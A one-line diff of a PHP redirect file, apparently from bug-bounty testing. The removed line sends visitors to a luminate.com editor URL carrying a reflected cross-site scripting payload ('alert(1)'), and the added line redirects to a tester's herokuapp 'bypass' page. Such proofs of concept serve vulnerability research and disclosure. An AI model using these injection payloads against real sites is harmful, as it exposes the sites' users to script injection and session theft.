@@ -1,1 +1,1 @@
-<?php header('location: https://editor.luminate.com/stripe_dynamic_css?style_id=style-7043347e-krmbvhve&viewer=xprs&parent_style=qq<div>"src=data:,alert%281%29></script><script%20x="</div>&v=1.4.1') ?> 
+<?php header('location: https://bughunt1307.herokuapp.com/bypass.html') ?> 
